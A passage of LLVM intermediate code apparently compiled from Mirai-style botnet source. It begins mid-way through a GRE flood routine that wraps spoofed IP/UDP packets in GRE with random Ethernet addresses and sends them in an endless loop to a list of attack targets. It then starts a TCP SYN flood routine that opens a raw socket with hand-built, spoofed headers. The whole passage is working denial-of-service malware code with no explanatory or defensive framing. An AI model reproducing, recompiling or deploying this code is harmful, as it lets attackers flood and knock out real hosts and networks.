  %204 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %203, i32 0, i32 3
  store i16 %202, i16* %204, align 4
  %205 = load i8, i8* %14, align 1
  %206 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %207 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %206, i32 0, i32 5
  store i8 %205, i8* %207, align 4
  %208 = load i8, i8* %15, align 1
  %209 = icmp ne i8 %208, 0
  br i1 %209, label %210, label %214

; <label>:210:                                    ; preds = %158
  %211 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %212 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %213 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %212, i32 0, i32 4
  store i16 %211, i16* %213, align 2
  br label %214

; <label>:214:                                    ; preds = %210, %158
  %215 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %216 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %215, i32 0, i32 6
  store i8 17, i8* %216, align 1
  %217 = call i32 @rand_next()
  %218 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %219 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %218, i32 0, i32 8
  store i32 %217, i32* %219, align 4
  %220 = load i8, i8* %20, align 1
  %221 = icmp ne i8 %220, 0
  br i1 %221, label %222, label %228

; <label>:222:                                    ; preds = %214
  %223 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %224 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %223, i32 0, i32 9
  %225 = load i32, i32* %224, align 4
  %226 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %227 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %226, i32 0, i32 9
  store i32 %225, i32* %227, align 4
  br label %236

; <label>:228:                                    ; preds = %214
  %229 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %230 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %229, i32 0, i32 8
  %231 = load i32, i32* %230, align 4
  %232 = sub i32 %231, 1024
  %233 = xor i32 %232, -1
  %234 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %235 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %234, i32 0, i32 9
  store i32 %233, i32* %235, align 4
  br label %236

; <label>:236:                                    ; preds = %228, %222
  %237 = load i16, i16* %16, align 2
  %238 = call zeroext i16 @htons(i16 zeroext %237) #7
  %239 = load %struct.udphdr*, %struct.udphdr** %26, align 8
  %240 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %239, i32 0, i32 0
  store i16 %238, i16* %240, align 2
  %241 = load i16, i16* %17, align 2
  %242 = call zeroext i16 @htons(i16 zeroext %241) #7
  %243 = load %struct.udphdr*, %struct.udphdr** %26, align 8
  %244 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %243, i32 0, i32 1
  store i16 %242, i16* %244, align 2
  %245 = load i32, i32* %18, align 4
  %246 = sext i32 %245 to i64
  %247 = add i64 8, %246
  %248 = trunc i64 %247 to i16
  %249 = call zeroext i16 @htons(i16 zeroext %248) #7
  %250 = load %struct.udphdr*, %struct.udphdr** %26, align 8
  %251 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %250, i32 0, i32 2
  store i16 %249, i16* %251, align 2
  br label %252

; <label>:252:                                    ; preds = %236
  %253 = load i32, i32* %9, align 4
  %254 = add nsw i32 %253, 1
  store i32 %254, i32* %9, align 4
  br label %96

; <label>:255:                                    ; preds = %96
  br label %256

; <label>:256:                                    ; preds = %471, %255
  store i32 0, i32* %9, align 4
  br label %257

; <label>:257:                                    ; preds = %468, %256
  %258 = load i32, i32* %9, align 4
  %259 = load i8, i8* %5, align 1
  %260 = zext i8 %259 to i32
  %261 = icmp slt i32 %258, %260
  br i1 %261, label %262, label %471

; <label>:262:                                    ; preds = %257
  %263 = load i8**, i8*** %11, align 8
  %264 = load i32, i32* %9, align 4
  %265 = sext i32 %264 to i64
  %266 = getelementptr inbounds i8*, i8** %263, i64 %265
  %267 = load i8*, i8** %266, align 8
  store i8* %267, i8** %30, align 8
  %268 = load i8*, i8** %30, align 8
  %269 = bitcast i8* %268 to %struct.iphdr*
  store %struct.iphdr* %269, %struct.iphdr** %31, align 8
  %270 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %271 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %270, i64 1
  %272 = bitcast %struct.iphdr* %271 to %struct.grehdr*
  store %struct.grehdr* %272, %struct.grehdr** %32, align 8
  %273 = load %struct.grehdr*, %struct.grehdr** %32, align 8
  %274 = getelementptr inbounds %struct.grehdr, %struct.grehdr* %273, i64 1
  %275 = bitcast %struct.grehdr* %274 to %struct.ethhdr*
  store %struct.ethhdr* %275, %struct.ethhdr** %33, align 8
  %276 = load %struct.ethhdr*, %struct.ethhdr** %33, align 8
  %277 = getelementptr inbounds %struct.ethhdr, %struct.ethhdr* %276, i64 1
  %278 = bitcast %struct.ethhdr* %277 to %struct.iphdr*
  store %struct.iphdr* %278, %struct.iphdr** %34, align 8
  %279 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %280 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %279, i64 1
  %281 = bitcast %struct.iphdr* %280 to %struct.udphdr*
  store %struct.udphdr* %281, %struct.udphdr** %35, align 8
  %282 = load %struct.udphdr*, %struct.udphdr** %35, align 8
  %283 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %282, i64 1
  %284 = bitcast %struct.udphdr* %283 to i8*
  store i8* %284, i8** %36, align 8
  %285 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %286 = load i32, i32* %9, align 4
  %287 = sext i32 %286 to i64
  %288 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %285, i64 %287
  %289 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %288, i32 0, i32 2
  %290 = load i8, i8* %289, align 4
  %291 = zext i8 %290 to i32
  %292 = icmp slt i32 %291, 32
  br i1 %292, label %293, label %314

; <label>:293:                                    ; preds = %262
  %294 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %295 = load i32, i32* %9, align 4
  %296 = sext i32 %295 to i64
  %297 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %294, i64 %296
  %298 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %297, i32 0, i32 1
  %299 = load i32, i32* %298, align 4
  %300 = call i32 @ntohl(i32 %299) #7
  %301 = call i32 @rand_next()
  %302 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %303 = load i32, i32* %9, align 4
  %304 = sext i32 %303 to i64
  %305 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %302, i64 %304
  %306 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %305, i32 0, i32 2
  %307 = load i8, i8* %306, align 4
  %308 = zext i8 %307 to i32
  %309 = lshr i32 %301, %308
  %310 = add i32 %300, %309
  %311 = call i32 @htonl(i32 %310) #7
  %312 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %313 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %312, i32 0, i32 9
  store i32 %311, i32* %313, align 4
  br label %314

; <label>:314:                                    ; preds = %293, %262
  %315 = load i32, i32* %21, align 4
  %316 = icmp eq i32 %315, -1
  br i1 %316, label %317, label %321

; <label>:317:                                    ; preds = %314
  %318 = call i32 @rand_next()
  %319 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %320 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %319, i32 0, i32 8
  store i32 %318, i32* %320, align 4
  br label %321

; <label>:321:                                    ; preds = %317, %314
  %322 = load i16, i16* %13, align 2
  %323 = zext i16 %322 to i32
  %324 = icmp eq i32 %323, 65535
  br i1 %324, label %325, label %340

; <label>:325:                                    ; preds = %321
  %326 = call i32 @rand_next()
  %327 = and i32 %326, 65535
  %328 = trunc i32 %327 to i16
  %329 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %330 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %329, i32 0, i32 3
  store i16 %328, i16* %330, align 4
  %331 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %332 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %331, i32 0, i32 3
  %333 = load i16, i16* %332, align 4
  %334 = zext i16 %333 to i32
  %335 = sub nsw i32 %334, 1000
  %336 = xor i32 %335, -1
  %337 = trunc i32 %336 to i16
  %338 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %339 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %338, i32 0, i32 3
  store i16 %337, i16* %339, align 4
  br label %340

; <label>:340:                                    ; preds = %325, %321
  %341 = load i16, i16* %16, align 2
  %342 = zext i16 %341 to i32
  %343 = icmp eq i32 %342, 65535
  br i1 %343, label %344, label %350

; <label>:344:                                    ; preds = %340
  %345 = call i32 @rand_next()
  %346 = and i32 %345, 65535
  %347 = trunc i32 %346 to i16
  %348 = load %struct.udphdr*, %struct.udphdr** %35, align 8
  %349 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %348, i32 0, i32 0
  store i16 %347, i16* %349, align 2
  br label %350

; <label>:350:                                    ; preds = %344, %340
  %351 = load i16, i16* %17, align 2
  %352 = zext i16 %351 to i32
  %353 = icmp eq i32 %352, 65535
  br i1 %353, label %354, label %360

; <label>:354:                                    ; preds = %350
  %355 = call i32 @rand_next()
  %356 = and i32 %355, 65535
  %357 = trunc i32 %356 to i16
  %358 = load %struct.udphdr*, %struct.udphdr** %35, align 8
  %359 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %358, i32 0, i32 1
  store i16 %357, i16* %359, align 2
  br label %360

; <label>:360:                                    ; preds = %354, %350
  %361 = load i8, i8* %20, align 1
  %362 = icmp ne i8 %361, 0
  br i1 %362, label %367, label %363

; <label>:363:                                    ; preds = %360
  %364 = call i32 @rand_next()
  %365 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %366 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %365, i32 0, i32 9
  store i32 %364, i32* %366, align 4
  br label %373

; <label>:367:                                    ; preds = %360
  %368 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %369 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %368, i32 0, i32 9
  %370 = load i32, i32* %369, align 4
  %371 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %372 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %371, i32 0, i32 9
  store i32 %370, i32* %372, align 4
  br label %373

; <label>:373:                                    ; preds = %367, %363
  %374 = call i32 @rand_next()
  store i32 %374, i32* %37, align 4
  %375 = call i32 @rand_next()
  store i32 %375, i32* %38, align 4
  %376 = call i32 @rand_next()
  store i32 %376, i32* %39, align 4
  %377 = load %struct.ethhdr*, %struct.ethhdr** %33, align 8
  %378 = getelementptr inbounds %struct.ethhdr, %struct.ethhdr* %377, i32 0, i32 0
  %379 = getelementptr inbounds [6 x i8], [6 x i8]* %378, i32 0, i32 0
  %380 = bitcast i32* %37 to i8*
  call void @util_memcpy(i8* %379, i8* %380, i32 4)
  %381 = load %struct.ethhdr*, %struct.ethhdr** %33, align 8
  %382 = getelementptr inbounds %struct.ethhdr, %struct.ethhdr* %381, i32 0, i32 1
  %383 = getelementptr inbounds [6 x i8], [6 x i8]* %382, i32 0, i32 0
  %384 = bitcast i32* %38 to i8*
  call void @util_memcpy(i8* %383, i8* %384, i32 4)
  %385 = load %struct.ethhdr*, %struct.ethhdr** %33, align 8
  %386 = getelementptr inbounds %struct.ethhdr, %struct.ethhdr* %385, i32 0, i32 0
  %387 = getelementptr inbounds [6 x i8], [6 x i8]* %386, i32 0, i32 0
  %388 = getelementptr inbounds i8, i8* %387, i64 4
  %389 = bitcast i32* %39 to i8*
  call void @util_memcpy(i8* %388, i8* %389, i32 2)
  %390 = load %struct.ethhdr*, %struct.ethhdr** %33, align 8
  %391 = getelementptr inbounds %struct.ethhdr, %struct.ethhdr* %390, i32 0, i32 1
  %392 = getelementptr inbounds [6 x i8], [6 x i8]* %391, i32 0, i32 0
  %393 = getelementptr inbounds i8, i8* %392, i64 4
  %394 = bitcast i32* %39 to i8*
  %395 = getelementptr inbounds i8, i8* %394, i64 2
  call void @util_memcpy(i8* %393, i8* %395, i32 2)
  %396 = load i8, i8* %19, align 1
  %397 = icmp ne i8 %396, 0
  br i1 %397, label %398, label %401

; <label>:398:                                    ; preds = %373
  %399 = load i8*, i8** %36, align 8
  %400 = load i32, i32* %18, align 4
  call void @rand_str(i8* %399, i32 %400)
  br label %401

; <label>:401:                                    ; preds = %398, %373
  %402 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %403 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %402, i32 0, i32 7
  store i16 0, i16* %403, align 2
  %404 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %405 = bitcast %struct.iphdr* %404 to i16*
  %406 = call zeroext i16 @checksum_generic(i16* %405, i32 20)
  %407 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %408 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %407, i32 0, i32 7
  store i16 %406, i16* %408, align 2
  %409 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %410 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %409, i32 0, i32 7
  store i16 0, i16* %410, align 2
  %411 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %412 = bitcast %struct.iphdr* %411 to i16*
  %413 = call zeroext i16 @checksum_generic(i16* %412, i32 20)
  %414 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %415 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %414, i32 0, i32 7
  store i16 %413, i16* %415, align 2
  %416 = load %struct.udphdr*, %struct.udphdr** %35, align 8
  %417 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %416, i32 0, i32 3
  store i16 0, i16* %417, align 2
  %418 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %419 = load %struct.udphdr*, %struct.udphdr** %35, align 8
  %420 = bitcast %struct.udphdr* %419 to i8*
  %421 = load %struct.udphdr*, %struct.udphdr** %35, align 8
  %422 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %421, i32 0, i32 2
  %423 = load i16, i16* %422, align 2
  %424 = load i32, i32* %18, align 4
  %425 = sext i32 %424 to i64
  %426 = add i64 8, %425
  %427 = trunc i64 %426 to i32
  %428 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %418, i8* %420, i16 zeroext %423, i32 %427)
  %429 = load %struct.udphdr*, %struct.udphdr** %35, align 8
  %430 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %429, i32 0, i32 3
  store i16 %428, i16* %430, align 2
  %431 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %432 = load i32, i32* %9, align 4
  %433 = sext i32 %432 to i64
  %434 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %431, i64 %433
  %435 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %434, i32 0, i32 0
  %436 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %435, i32 0, i32 0
  store i16 2, i16* %436, align 4
  %437 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %438 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %437, i32 0, i32 9
  %439 = load i32, i32* %438, align 4
  %440 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %441 = load i32, i32* %9, align 4
  %442 = sext i32 %441 to i64
  %443 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %440, i64 %442
  %444 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %443, i32 0, i32 0
  %445 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %444, i32 0, i32 2
  %446 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %445, i32 0, i32 0
  store i32 %439, i32* %446, align 4
  %447 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %448 = load i32, i32* %9, align 4
  %449 = sext i32 %448 to i64
  %450 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %447, i64 %449
  %451 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %450, i32 0, i32 0
  %452 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %451, i32 0, i32 1
  store i16 0, i16* %452, align 2
  %453 = load i32, i32* %10, align 4
  %454 = load i8*, i8** %30, align 8
  %455 = load i32, i32* %18, align 4
  %456 = sext i32 %455 to i64
  %457 = add i64 66, %456
  %458 = bitcast %union.__CONST_SOCKADDR_ARG* %40 to %struct.sockaddr**
  %459 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %460 = load i32, i32* %9, align 4
  %461 = sext i32 %460 to i64
  %462 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %459, i64 %461
  %463 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %462, i32 0, i32 0
  %464 = bitcast %struct.sockaddr_in* %463 to %struct.sockaddr*
  store %struct.sockaddr* %464, %struct.sockaddr** %458, align 8
  %465 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %40, i32 0, i32 0
  %466 = load %struct.sockaddr*, %struct.sockaddr** %465, align 8
  %467 = call i64 @sendto(i32 %453, i8* %454, i64 %457, i32 16384, %struct.sockaddr* %466, i32 16)
  br label %468

; <label>:468:                                    ; preds = %401
  %469 = load i32, i32* %9, align 4
  %470 = add nsw i32 %469, 1
  store i32 %470, i32* %9, align 4
  br label %257

; <label>:471:                                    ; preds = %257
  br label %256

; <label>:472:                                    ; preds = %92, %86
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @attack_tcp_syn(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %5 = alloca i8, align 1
  %6 = alloca %struct.attack_target*, align 8
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_option*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i8**, align 8
  %12 = alloca i8, align 1
  %13 = alloca i16, align 2
  %14 = alloca i8, align 1
  %15 = alloca i8, align 1
  %16 = alloca i16, align 2
  %17 = alloca i16, align 2
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i8, align 1
  %21 = alloca i8, align 1
  %22 = alloca i8, align 1
  %23 = alloca i8, align 1
  %24 = alloca i8, align 1
  %25 = alloca i8, align 1
  %26 = alloca i32, align 4
  %27 = alloca %struct.iphdr*, align 8
  %28 = alloca %struct.tcphdr*, align 8
  %29 = alloca i8*, align 8
  %30 = alloca i8*, align 8
  %31 = alloca %struct.iphdr*, align 8
  %32 = alloca %struct.tcphdr*, align 8
  %33 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i8 %0, i8* %5, align 1
  store %struct.attack_target* %1, %struct.attack_target** %6, align 8
  store i8 %2, i8* %7, align 1
  store %struct.attack_option* %3, %struct.attack_option** %8, align 8
  %34 = load i8, i8* %5, align 1
  %35 = zext i8 %34 to i64
  %36 = call noalias i8* @calloc(i64 %35, i64 8) #6
  %37 = bitcast i8* %36 to i8**
  store i8** %37, i8*** %11, align 8
  %38 = load i8, i8* %7, align 1
  %39 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %40 = call i32 @attack_get_opt_int(i8 zeroext %38, %struct.attack_option* %39, i8 zeroext 2, i32 0)
  %41 = trunc i32 %40 to i8
  store i8 %41, i8* %12, align 1
  %42 = load i8, i8* %7, align 1
  %43 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %44 = call i32 @attack_get_opt_int(i8 zeroext %42, %struct.attack_option* %43, i8 zeroext 3, i32 65535)
  %45 = trunc i32 %44 to i16
  store i16 %45, i16* %13, align 2
  %46 = load i8, i8* %7, align 1
  %47 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %48 = call i32 @attack_get_opt_int(i8 zeroext %46, %struct.attack_option* %47, i8 zeroext 4, i32 64)
  %49 = trunc i32 %48 to i8
  store i8 %49, i8* %14, align 1
  %50 = load i8, i8* %7, align 1
  %51 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %52 = call i32 @attack_get_opt_int(i8 zeroext %50, %struct.attack_option* %51, i8 zeroext 5, i32 1)
  %53 = trunc i32 %52 to i8
  store i8 %53, i8* %15, align 1
  %54 = load i8, i8* %7, align 1
  %55 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %56 = call i32 @attack_get_opt_int(i8 zeroext %54, %struct.attack_option* %55, i8 zeroext 6, i32 65535)
  %57 = trunc i32 %56 to i16
  store i16 %57, i16* %16, align 2
  %58 = load i8, i8* %7, align 1
  %59 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %60 = call i32 @attack_get_opt_int(i8 zeroext %58, %struct.attack_option* %59, i8 zeroext 7, i32 65535)
  %61 = trunc i32 %60 to i16
  store i16 %61, i16* %17, align 2
  %62 = load i8, i8* %7, align 1
  %63 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %64 = call i32 @attack_get_opt_int(i8 zeroext %62, %struct.attack_option* %63, i8 zeroext 17, i32 65535)
  store i32 %64, i32* %18, align 4
  %65 = load i8, i8* %7, align 1
  %66 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %67 = call i32 @attack_get_opt_int(i8 zeroext %65, %struct.attack_option* %66, i8 zeroext 18, i32 0)
  store i32 %67, i32* %19, align 4
  %68 = load i8, i8* %7, align 1
  %69 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %70 = call i32 @attack_get_opt_int(i8 zeroext %68, %struct.attack_option* %69, i8 zeroext 11, i32 0)
  %71 = trunc i32 %70 to i8
  store i8 %71, i8* %20, align 1
  %72 = load i8, i8* %7, align 1
  %73 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %74 = call i32 @attack_get_opt_int(i8 zeroext %72, %struct.attack_option* %73, i8 zeroext 12, i32 0)
  %75 = trunc i32 %74 to i8
  store i8 %75, i8* %21, align 1
  %76 = load i8, i8* %7, align 1
  %77 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %78 = call i32 @attack_get_opt_int(i8 zeroext %76, %struct.attack_option* %77, i8 zeroext 13, i32 0)
  %79 = trunc i32 %78 to i8
  store i8 %79, i8* %22, align 1
  %80 = load i8, i8* %7, align 1
  %81 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %82 = call i32 @attack_get_opt_int(i8 zeroext %80, %struct.attack_option* %81, i8 zeroext 14, i32 0)
  %83 = trunc i32 %82 to i8
  store i8 %83, i8* %23, align 1
  %84 = load i8, i8* %7, align 1
  %85 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %86 = call i32 @attack_get_opt_int(i8 zeroext %84, %struct.attack_option* %85, i8 zeroext 15, i32 1)
  %87 = trunc i32 %86 to i8
  store i8 %87, i8* %24, align 1
  %88 = load i8, i8* %7, align 1
  %89 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %90 = call i32 @attack_get_opt_int(i8 zeroext %88, %struct.attack_option* %89, i8 zeroext 16, i32 0)
  %91 = trunc i32 %90 to i8
  store i8 %91, i8* %25, align 1
  %92 = load i8, i8* %7, align 1
  %93 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %94 = load i32, i32* @LOCAL_ADDR, align 4
  %95 = call i32 @attack_get_opt_ip(i8 zeroext %92, %struct.attack_option* %93, i8 zeroext 25, i32 %94)
  store i32 %95, i32* %26, align 4
  %96 = call i32 @socket(i32 2, i32 3, i32 6) #6
  store i32 %96, i32* %10, align 4
  %97 = icmp eq i32 %96, -1
  br i1 %97, label %98, label %99

; <label>:98:                                     ; preds = %4
  br label %437

; <label>:99:                                     ; preds = %4
  store i32 1, i32* %9, align 4
  %100 = load i32, i32* %10, align 4
  %101 = bitcast i32* %9 to i8*
  %102 = call i32 @setsockopt(i32 %100, i32 0, i32 3, i8* %101, i32 4) #6
  %103 = icmp eq i32 %102, -1
  br i1 %103, label %104, label %107

; <label>:104:                                    ; preds = %99
  %105 = load i32, i32* %10, align 4
  %106 = call i32 @close(i32 %105)
  br label %437

; <label>:107:                                    ; preds = %99
  store i32 0, i32* %9, align 4
  br label %108

; <label>:108:                                    ; preds = %285, %107
  %109 = load i32, i32* %9, align 4
  %110 = load i8, i8* %5, align 1
  %111 = zext i8 %110 to i32
  %112 = icmp slt i32 %109, %111
  br i1 %112, label %113, label %288

; <label>:113:                                    ; preds = %108
  %114 = call noalias i8* @calloc(i64 128, i64 1) #6
  %115 = load i8**, i8*** %11, align 8
  %116 = load i32, i32* %9, align 4
  %117 = sext i32 %116 to i64
  %118 = getelementptr inbounds i8*, i8** %115, i64 %117
  store i8* %114, i8** %118, align 8
  %119 = load i8**, i8*** %11, align 8
  %120 = load i32, i32* %9, align 4
  %121 = sext i32 %120 to i64
  %122 = getelementptr inbounds i8*, i8** %119, i64 %121
  %123 = load i8*, i8** %122, align 8
  %124 = bitcast i8* %123 to %struct.iphdr*
  store %struct.iphdr* %124, %struct.iphdr** %27, align 8
  %125 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %126 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %125, i64 1
  %127 = bitcast %struct.iphdr* %126 to %struct.tcphdr*
  store %struct.tcphdr* %127, %struct.tcphdr** %28, align 8
  %128 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %129 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %128, i64 1
  %130 = bitcast %struct.tcphdr* %129 to i8*
  store i8* %130, i8** %29, align 8
  %131 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %132 = bitcast %struct.iphdr* %131 to i8*
  %133 = load i8, i8* %132, align 4
  %134 = and i8 %133, 15
  %135 = or i8 %134, 64
  store i8 %135, i8* %132, align 4
  %136 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %137 = bitcast %struct.iphdr* %136 to i8*
  %138 = load i8, i8* %137, align 4
  %139 = and i8 %138, -16
  %140 = or i8 %139, 5
  store i8 %140, i8* %137, align 4
  %141 = load i8, i8* %12, align 1
  %142 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %143 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %142, i32 0, i32 1
  store i8 %141, i8* %143, align 1
  %144 = call zeroext i16 @htons(i16 zeroext 60) #7
  %145 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %146 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %145, i32 0, i32 2
  store i16 %144, i16* %146, align 2
  %147 = load i16, i16* %13, align 2
  %148 = call zeroext i16 @htons(i16 zeroext %147) #7
  %149 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %150 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %149, i32 0, i32 3
  store i16 %148, i16* %150, align 4
  %151 = load i8, i8* %14, align 1
  %152 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %153 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %152, i32 0, i32 5
  store i8 %151, i8* %153, align 4
  %154 = load i8, i8* %15, align 1
  %155 = icmp ne i8 %154, 0
  br i1 %155, label %156, label %160

; <label>:156:                                    ; preds = %113
  %157 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %158 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %159 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %158, i32 0, i32 4
  store i16 %157, i16* %159, align 2
  br label %160

; <label>:160:                                    ; preds = %156, %113
  %161 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %162 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %161, i32 0, i32 6
  store i8 6, i8* %162, align 1
  %163 = load i32, i32* %26, align 4
  %164 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %165 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %164, i32 0, i32 8
  store i32 %163, i32* %165, align 4
  %166 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %167 = load i32, i32* %9, align 4
  %168 = sext i32 %167 to i64
  %169 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %166, i64 %168
  %170 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %169, i32 0, i32 1
  %171 = load i32, i32* %170, align 4
  %172 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %173 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %172, i32 0, i32 9
  store i32 %171, i32* %173, align 4
  %174 = load i16, i16* %16, align 2
  %175 = call zeroext i16 @htons(i16 zeroext %174) #7
  %176 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %177 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %176, i32 0, i32 0
  store i16 %175, i16* %177, align 4
  %178 = load i16, i16* %17, align 2
  %179 = call zeroext i16 @htons(i16 zeroext %178) #7
  %180 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %181 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %180, i32 0, i32 1
  store i16 %179, i16* %181, align 2
  %182 = load i32, i32* %18, align 4
  %183 = trunc i32 %182 to i16
  %184 = call zeroext i16 @htons(i16 zeroext %183) #7
  %185 = zext i16 %184 to i32
  %186 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %187 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %186, i32 0, i32 2
  store i32 %185, i32* %187, align 4
  %188 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %189 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %188, i32 0, i32 4
  %190 = load i16, i16* %189, align 4
  %191 = and i16 %190, -241
  %192 = or i16 %191, 160
  store i16 %192, i16* %189, align 4
  %193 = load i8, i8* %20, align 1
  %194 = sext i8 %193 to i16
  %195 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
